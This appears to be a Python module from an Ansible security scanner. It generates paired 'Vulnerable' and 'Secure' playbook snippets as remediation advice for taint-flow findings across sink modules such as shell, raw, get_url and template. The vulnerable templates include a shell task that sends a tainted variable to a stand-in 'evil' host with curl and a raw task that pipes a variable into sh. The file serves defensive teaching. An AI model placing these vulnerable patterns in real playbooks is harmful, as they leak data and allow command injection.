#!/usr/bin/env python3
"""Remediations for cross-file taint findings."""

import re

from .base import BaseRemediationGenerator


class TaintFlowRemediationGenerator(BaseRemediationGenerator):
    _SINK_TEMPLATES = {
        "shell": {
            "vuln": ('- ansible.builtin.shell: "curl http://evil/{{{{ {var} }}}}"\n'),
            "secure": (
                "- ansible.builtin.command:\n"
                "    argv:\n"
                "      - /usr/bin/safe-tool\n"
                '      - "--arg"\n'
                '      - "{{{{ {safe} }}}}"\n'
            ),
        },
        "raw": {
            "vuln": '- ansible.builtin.raw: "echo {{{{ {var} }}}} | sh"\n',
            "secure": (
                "- ansible.builtin.command:\n"
                "    argv:\n"
                "      - /usr/bin/safe-tool\n"
                '      - "--arg"\n'
                '      - "{{{{ {safe} }}}}"\n'
            ),
        },
        "command": {
            "vuln": '- ansible.builtin.command: "/bin/tool --flag {{{{ {var} }}}}"\n',
            "secure": (
                "- ansible.builtin.command:\n"
                "    argv:\n"
                "      - /usr/bin/safe-tool\n"
                '      - "--arg"\n'
                '      - "{{{{ {safe} }}}}"\n'
            ),
        },
        "script": {
            "vuln": '- ansible.builtin.script: "/tmp/setup.sh {{{{ {var} }}}}"\n',
            "secure": (
                "- ansible.builtin.script:\n"
                '    cmd: "/usr/local/bin/vetted-script.sh {{{{ {safe} }}}}"\n'
            ),
        },
        "uri": {
            "vuln": (
                "- ansible.builtin.uri:\n"
                '    url: "https://api.example.com/{{{{ {var} }}}}"\n'
                "    method: GET\n"
            ),
            "secure": (
                "- ansible.builtin.uri:\n"
                '    url: "https://api.example.com/{{{{ {safe} }}}}"\n'
                "    method: GET\n"
                "    validate_certs: true\n"
            ),
        },
        "get_url": {
            "vuln": (
                "- ansible.builtin.get_url:\n"
                '    url: "http://cdn.example.com/{{{{ {var} }}}}.tar.gz"\n'
                "    dest: /opt/app/\n"
            ),
            "secure": (
                "- ansible.builtin.get_url:\n"
                '    url: "https://cdn.example.com/{{{{ {safe} }}}}.tar.gz"\n'
                "    dest: /opt/app/\n"
                '    checksum: "sha256:<pinned-digest>"\n'
                "    validate_certs: true\n"
            ),
        },
        "template": {
            "vuln": (
                "- ansible.builtin.template:\n"
                '    src: "{{{{ {var} }}}}.j2"\n'
                "    dest: /etc/app/config\n"
            ),
            "secure": (
                "- ansible.builtin.template:\n"
                '    src: "templates/{{{{ {safe} }}}}.j2"\n'
                "    dest: /etc/app/config\n"
                "    mode: '0640'\n"
            ),
        },
        "copy": {
            "vuln": (
                "- ansible.builtin.copy:\n"
                '    content: "{{{{ {var} }}}}"\n'
                "    dest: /etc/app/config\n"
            ),
            "secure": (
                "- ansible.builtin.copy:\n"
                '    content: "{{{{ {safe} }}}}"\n'
                "    dest: /etc/app/config\n"
                "    mode: '0640'\n"
            ),
        },
    }

    _VAR_NAME_RE = re.compile(r"\{\{\s*([A-Za-z_][A-Za-z0-9_]*)")

    _SINK_MODULE_RE = re.compile(
        r"(?:ansible\.builtin\.)?"
        r"(shell|raw|command|script|uri|get_url|template|copy)"
    )

    def generate_taint_flow_fix(
        self,
        rule_id: str,
        code_snippet: str,
        sink_module: str = "",
        var_name: str = "",
    ) -> str:
        base = self._resolve_sink_base(sink_module, code_snippet)
        var = var_name or self._extract_var(code_snippet) or "tainted_var"
        safe_var = f"{var}_safe"

        taint_source = f"- set_fact:\n    {var}: \"{{{{ lookup('pipe', untrusted) }}}}\"\n"
        sanitise = (
            f"- set_fact:\n    {safe_var}: "
            f"\"{{{{ {var} | regex_replace('[^a-zA-Z0-9_.:/-]', '') }}}}\"\n"
        )

        template = self._SINK_TEMPLATES.get(base)
        if template is None:
            vuln_block = f'- ansible.builtin.shell: "echo {{{{ {var} }}}}"\n'
            secure_block = (
                "- ansible.builtin.command:\n"
                "    argv:\n"
                "      - /usr/bin/safe-tool\n"
                '      - "--arg"\n'
                f'      - "{{{{ {safe_var} }}}}"\n'
            )
        else:
            vuln_block = template["vuln"].format(var=var, safe=safe_var)
            secure_block = template["secure"].format(var=var, safe=safe_var)

        return (
            "**❌ Vulnerable:**\n```yaml\n" + taint_source + vuln_block + "```\n\n"
            "**✅ Secure:**\n```yaml\n" + sanitise + secure_block + "```"
        )

    @classmethod
    def _resolve_sink_base(cls, sink_module: str, code_snippet: str) -> str:
        if sink_module:
            return sink_module.rsplit(".", 1)[-1]
        m = cls._SINK_MODULE_RE.search(code_snippet)
        return m.group(1) if m else ""

    @classmethod
    def _extract_var(cls, code_snippet: str) -> str:
        m = cls._VAR_NAME_RE.search(code_snippet)
        return m.group(1) if m else ""
